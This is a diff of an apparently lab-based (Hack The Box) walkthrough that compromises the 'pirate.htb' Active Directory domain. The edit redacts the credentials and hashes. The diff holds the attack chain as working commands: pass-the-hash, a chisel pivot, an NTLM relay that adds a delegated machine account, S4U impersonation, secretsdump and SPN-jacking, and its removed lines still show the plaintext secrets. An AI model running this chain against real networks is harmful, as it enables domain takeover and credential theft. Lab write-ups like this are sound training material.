@@ -64,12 +64,12 @@
                 The first useful step was to validate the known low-privilege domain credential recovered from public research. SMB access confirmed that
                 the credential was valid and that the target was indeed operating as a domain controller.
             </p>
-            <pre><code>smbclient -L //10.129.6.124 -U 'PIRATE\pentest%p3nt3st2025!&amp;'</code></pre>
+            <pre><code>smbclient -L //10.129.6.124 -U 'PIRATE\pentest%p3nt3st20****'</code></pre>
             <p>
                 Once this worked, there was no reason to waste time on the IIS page. The low-privilege account was enough to continue with the AD path.
             </p>
             <pre><code>Username: pentest
-Password: p3nt3st2025!&amp;</code></pre>
+Password: p3nt3st20****</code></pre>
         </div>
 
         <div class="section">
@@ -83,8 +83,8 @@ Password: p3nt3st2025!&amp;</code></pre>
             <pre><code>curl -ksSI http://10.129.6.124/ | grep '^Date:'
 sudo date -u -s '2026-05-29 00:15:31'
 
-KRB5CCNAME=MS01.ccache impacket-getTGT 'pirate.htb/MS01$:ms01'
-KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'</code></pre>
+KRB5CCNAME=MS01.ccache impacket-getTGT 'pirate.htb/MS01$:****'
+KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:ex****'</code></pre>
             <p>
                 The Kerberos requests succeeded, confirming that the machine accounts were still using predictable legacy passwords.
             </p>
@@ -97,12 +97,12 @@ KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'</code></pre
                 Kerberos success alone was not enough for the next steps, so I changed the password of the controlled machine account and used it to
                 access the LDAP data required for managed service account extraction.
             </p>
-            <pre><code>impacket-changepasswd pirate.htb/MS01$:ms01@10.129.6.124 -newpass 'Boltech@123'</code></pre>
+            <pre><code>impacket-changepasswd pirate.htb/MS01$:****@10.129.6.124 -newpass 'Boltech****'</code></pre>
             <p>
                 After taking over the machine account, the gMSA data became readable. The most useful result was the NTLM material for the ADFS gMSA,
                 which later provided both foothold and relay capability.
             </p>
-            <pre><code>gMSA_ADFS_prod$ : 76754c94319e3a7dc07ba09aa79028ee</code></pre>
+            <pre><code>gMSA_ADFS_prod$ : 76754c94319e3a7dc07ba09aa790****</code></pre>
         </div>
 
         <div class="section">
@@ -113,7 +113,7 @@ KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'</code></pre
                 internal host <code>WEB01</code> was reachable on TCP/5985. A reverse SOCKS pivot was then established so that internal tooling could be
                 used cleanly from the attacking machine.
             </p>
-            <pre><code>evil-winrm -i 10.129.6.124 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa79028ee'
+            <pre><code>evil-winrm -i 10.129.6.124 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa790****'
 
 Test-NetConnection 192.168.100.2 -Port 5985
 chisel server --port 8001 --reverse
@@ -138,13 +138,13 @@ proxychains4 -f proxychains-pirate.conf coercer coerce \
 -l 10.10.14.242 \
 -t 192.168.100.2 \
 -u GMSA_ADFS_prod$ \
---hash :76754c94319e3a7dc07ba09aa79028ee \
+--hash :76754c94319e3a7dc07ba09aa790**** \
 -d pirate.htb --always-continue</code></pre>
             <p>
                 The relay succeeded and automatically created a new delegated machine account.
             </p>
             <pre><code>Authenticating against ldaps://10.129.6.124 as PIRATE/WEB01$ SUCCEED
-Adding new computer with username: KAJTHDVE$ and password: hgpCsk67PSZ)!ry result: OK
+Adding new computer with username: KAJTHDVE$ and password: hgpCsk67PSZ**** result: OK
 Delegation rights modified succesfully!
 KAJTHDVE$ can now impersonate users on WEB01$ via S4U2Proxy</code></pre>
         </div>
@@ -160,7 +160,7 @@ KAJTHDVE$ can now impersonate users on WEB01$ via S4U2Proxy</code></pre>
             <pre><code>impacket-getST -spn cifs/web01.pirate.htb \
 -impersonate Administrator \
 -dc-ip 10.129.6.124 \
-'pirate.htb/KAJTHDVE$:hgpCsk67PSZ)!ry'
+'pirate.htb/KAJTHDVE$:hgpCsk67PSZ****'
 
 export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
 proxychains4 -q impacket-psexec -k -no-pass pirate.htb/Administrator@web01.pirate.htb \
@@ -186,8 +186,8 @@ proxychains4 -f proxychains-pirate.conf -q impacket-secretsdump \
             <p>
                 This produced the high-value material needed for the root path, including the plaintext password for <code>a.white</code>.
             </p>
-            <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
-PIRATE\a.white:E2nvAOKSz5Xz2MJu</code></pre>
+            <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4f****:::
+PIRATE\a.white:E2nvAOKSz5Xz****</code></pre>
         </div>
 
         <div class="section">
@@ -199,8 +199,8 @@ PIRATE\a.white:E2nvAOKSz5Xz2MJu</code></pre>
                 privileged account.
             </p>
             <pre><code>bloodyAD --host 10.129.6.124 -d pirate.htb \
--u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
-set password a.white_adm 'Boltech@123'</code></pre>
+-u 'a.white' -p 'E2nvAOKSz5Xz****' \
+set password a.white_adm 'Boltech****'</code></pre>
             <pre><code>[+] Password changed successfully!</code></pre>
             <p>
                 At this point, the path to domain compromise became much shorter because <code>a.white_adm</code> had the rights required for SPN abuse.
@@ -215,7 +215,7 @@ set password a.white_adm 'Boltech@123'</code></pre>
                 <code>HTTP/WEB01.pirate.htb</code> was originally registered on <code>WEB01$</code>, so it first had to be removed there and then added to
                 <code>DC01$</code>. That is the core of the SPN-jacking step.
             </p>
-            <pre><code>ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+            <pre><code>ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech****' &lt;&lt;EOF
 dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
 changetype: modify
 delete: servicePrincipalName
@@ -223,7 +223,7 @@ servicePrincipalName: HTTP/WEB01.pirate.htb
 -
 EOF
 
-ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech****' &lt;&lt;EOF
 dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
 changetype: modify
 add: servicePrincipalName
@@ -246,7 +246,7 @@ EOF</code></pre>
             <pre><code>impacket-getST -spn 'HTTP/WEB01.pirate.htb' \
 -impersonate Administrator \
 -dc-ip 10.129.6.124 \
-'pirate.htb/a.white_adm:Boltech@123' \
+'pirate.htb/a.white_adm:Boltech****' \
 -altservice 'CIFS/DC01.pirate.htb'</code></pre>
             <pre><code>[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache</code></pre>
             <p>
